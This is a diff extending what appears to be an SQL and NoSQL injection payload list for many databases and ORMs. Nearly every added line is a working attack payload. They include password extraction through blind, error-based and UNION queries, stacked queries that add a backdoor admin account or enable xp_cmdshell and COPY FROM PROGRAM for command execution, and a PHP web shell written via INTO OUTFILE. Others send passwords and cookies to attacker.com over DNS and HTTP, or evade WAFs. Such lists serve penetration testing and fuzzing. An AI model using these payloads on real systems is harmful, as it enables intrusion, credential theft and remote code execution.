@@ -83,7 +83,7 @@ admin'%00--
 '; CREATE TRIGGER exfil AFTER INSERT ON users FOR EACH ROW EXECUTE FUNCTION exfiltrate(); --
 # Stored procedure abuse
 '; EXEC sp_makewebtask 'C:\output.html', 'SELECT * FROM users'; --
-# Second-order injection — stored payload
+# Second-order injection (stored payload)
 Register with username: admin'-- (the injection activates when the username is used in a later query)
 # LDAP injection
 *)(uid=*))(|(uid=*
@@ -91,3 +91,98 @@ Register with username: admin'-- (the injection activates when the username is u
 ' or '1'='1
 # ORM injection (Sequelize)
 {"username": {"[Op.like]": "%"}}
+# Sequelize operator injection (ne)
+{"username": {"[Op.ne]": null}}
+# Sequelize operator injection (or)
+{"[Op.or]": [{"username": "admin"}, {"role": "admin"}]}
+# TypeORM injection via find options
+{"where": {"role": "admin"}, "select": ["password"]}
+# Prisma raw query injection
+prisma.$queryRaw`SELECT * FROM users WHERE id = ${userInput}`
+# Django ORM filter injection
+User.objects.filter(username__startswith='adm')
+# SQLAlchemy text injection
+db.session.execute(text("SELECT * FROM users WHERE name = '" + input + "'"))
+# Hibernate HQL injection
+from User where username = '' or '1'='1'
+# JPA JPQL injection
+SELECT u FROM User u WHERE u.name = '' OR '1'='1'
+# Boolean-based blind: single char extraction
+' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' --
+# Boolean-based blind: binary search
+' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 64 --
+# Time-based blind: conditional delay
+' AND IF(1=1, SLEEP(5), 0) --
+# Time-based blind: PostgreSQL conditional
+' AND CASE WHEN (SELECT 1 FROM users WHERE username='admin' AND LENGTH(password)>5) THEN pg_sleep(5) ELSE pg_sleep(0) END --
+# Error-based: double query (MySQL)
+' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT password FROM users LIMIT 1), FLOOR(RAND()*2)) x FROM information_schema.tables GROUP BY x) y) --
+# Error-based: XMLType (Oracle)
+' AND EXTRACTVALUE(XMLType('<?xml version="1.0"?><root>'||(SELECT password FROM users WHERE ROWNUM=1)||'</root>'), '/root') --
+# UNION-based: column count probe
+' UNION SELECT NULL --
+' UNION SELECT NULL, NULL --
+' UNION SELECT NULL, NULL, NULL --
+# UNION-based: data type probe
+' UNION SELECT 'a', NULL, NULL --
+' UNION SELECT NULL, 'a', NULL --
+# UNION-based: information_schema enumeration
+' UNION SELECT table_name, column_name, NULL FROM information_schema.columns --
+# UNION-based: extract with GROUP_CONCAT (MySQL)
+' UNION SELECT GROUP_CONCAT(username, 0x3a, password), NULL FROM users --
+# UNION-based: extract with string_agg (PostgreSQL)
+' UNION SELECT string_agg(username || ':' || password, ','), NULL FROM users --
+# Stacked: create backdoor account
+'; INSERT INTO users (username, password, role) VALUES ('backdoor', 'pass123', 'admin'); --
+# Stacked: create function for RCE (PostgreSQL)
+'; CREATE OR REPLACE FUNCTION exec(cmd text) RETURNS text AS $$ BEGIN RETURN (SELECT cmd); END; $$ LANGUAGE plpgsql; --
+# Stacked: enable xp_cmdshell (MSSQL)
+'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
+# RCE via xp_cmdshell (MSSQL)
+'; EXEC xp_cmdshell 'whoami'; --
+# File read via LOAD_FILE (MySQL)
+' UNION SELECT LOAD_FILE('/etc/passwd'), NULL --
+# File write via INTO OUTFILE (MySQL)
+' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php' --
+# File write via COPY (PostgreSQL)
+'; COPY (SELECT 'pwned') TO '/var/www/html/proof.txt'; --
+# RCE via COPY FROM PROGRAM (PostgreSQL)
+'; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'whoami'; --
+# DNS exfiltration via MSSQL
+'; DECLARE @d varchar(1024); SET @d=(SELECT TOP 1 password FROM users); EXEC('master..xp_dirtree "\\' + @d + '.attacker.com\x"'); --
+# DNS exfiltration via MySQL
+' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\a')) --
+# HTTP request via Oracle UTL_HTTP
+' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/?data='||(SELECT password FROM users WHERE ROWNUM=1)) FROM DUAL --
+# Bypass WAF: comment obfuscation
+'/**/UNION/**/SELECT/**/username,password/**/FROM/**/users--
+# Bypass WAF: double URL encoding
+%2527%2520UNION%2520SELECT%2520password%2520FROM%2520users--
+# Bypass WAF: hex encoding function names
+' UNION 0x53454C454354 password FROM users --
+# Bypass WAF: concatenation split
+' UN/**/ION SEL/**/ECT password FR/**/OM users --
+# Bypass WAF: scientific notation
+' OR 1e0=1e0 --
+# Bypass WAF: null byte
+%00' OR 1=1 --
+# Second-order: stored XSS via SQL
+INSERT INTO comments (body) VALUES ('<script>fetch("https://attacker.com/?c="+document.cookie)</script>')
+# Second-order: delayed injection via username
+Register with username: admin'-- then trigger via password reset that queries by username.
+# NoSQL: JavaScript injection (MongoDB)
+{"$where": "this.password == 'test' || true"}
+# NoSQL: $regex password extraction
+{"username": "admin", "password": {"$regex": "^a"}}
+# NoSQL: array comparison bypass
+{"username": "admin", "password": {"$gt": ""}}
+# NoSQL: aggregation pipeline injection
+[{"$lookup": {"from": "users", "localField": "x", "foreignField": "x", "as": "leaked"}}]
+# Redis command injection
+EVAL "return redis.call('keys','*')" 0
+# Cassandra CQL injection
+'; SELECT * FROM system_auth.roles; --
+# Neo4j Cypher injection
+' OR 1=1 WITH * MATCH (n) RETURN n LIMIT 100 //
+# InfluxDB injection
+'; SHOW MEASUREMENTS --
